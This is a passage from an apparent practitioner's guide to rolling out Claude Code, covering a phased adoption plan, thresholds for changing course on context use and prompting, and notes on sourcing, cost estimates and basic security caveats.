- Set up `sooperset/mcp-atlassian` in read-only mode first, and confirm PAT auth against your instances.

**Weeks two and three**
- Build the context cache: a script that pulls ticket, wiki, and repo context to versioned markdown, wired up with `@` references.
- Introduce subagents for exploration and adversarial review.
- Try a worktree plus a Writer/Reviewer parallel session.

**Month two**
- Headless `claude -p` in CI for automated review, with tools locked to Read, Grep, and Glob.
- Devcontainer or a disposable VM, plus auto mode, for semi-autonomous runs.
- Per-subagent model pinning: Haiku explorers, Opus for hard planning.

**Thresholds that should change your plan**
- If Claude ignores a CLAUDE.md rule repeatedly, the file is too long. Prune it or convert it to a hook.
- If `/context` shows MCP eating more than 10 to 15% of the window, disable unused servers and move to CLI plus cached files.
- If you are correcting more than twice per task, your prompts are underspecified. Invest in specs and reference-pointing.
- If a task is not verifiable, either build a check first or do not use Claude Code for it.

---

## 11. Caveats and Sourcing

**This is a fast-moving product.** Claude Code ships roughly weekly. Version numbers, flags, model names, and thinking behavior cited here reflect the state of things as of August 2026. Verify with `claude --version`, `/help`, and the official changelog. The manual thinking trigger words in particular are being retired on Claude 5 in favor of adaptive thinking and `/effort`.

**Official versus community.** Anthropic-sourced: the best-practices documentation, the session-management and context-engineering posts, the hooks, skills, and permissions docs, and the auto-mode post. Community and third-party, flagged where used: the MCP token-overhead figures (550 to 850 tokens per tool and the 67,300-token, 33.7% measurement) come from `anthropics/claude-code` GitHub issue #11364. The 4x-to-32x and 100%-versus-72% figures and the 800-token `gh`-tips result come from Scalekit's benchmark. The roughly 85% and 134K-to-5K reduction is an Anthropic internal figure reported via VentureBeat. The `sooperset/mcp-atlassian` and `glab` self-hosted specifics, `eunsanMountain/atlassian-skills`, and worktree ergonomics are community or vendor documented. The `glab mcp serve` and GitLab Duo MCP paths are officially experimental or immature.

**On "context rot."** The term was formalized by Chroma Research's July 14, 2025 report by Hong, Troynikov, and Huber, which tested 18 models and found reliability degrades with input length. Anthropic cites this line of work in its own context-engineering guidance.

**Numbers are estimates.** `/usage` dollar figures are local estimates, not your bill. On Max and Pro, usage is included in the subscription. Thinking-token costs vary widely by task.

**Security is your responsibility.** Devcontainers reduce but do not eliminate exfiltration risk under `--dangerously-skip-permissions`. Treat ingested Jira, Confluence, and web content as untrusted.
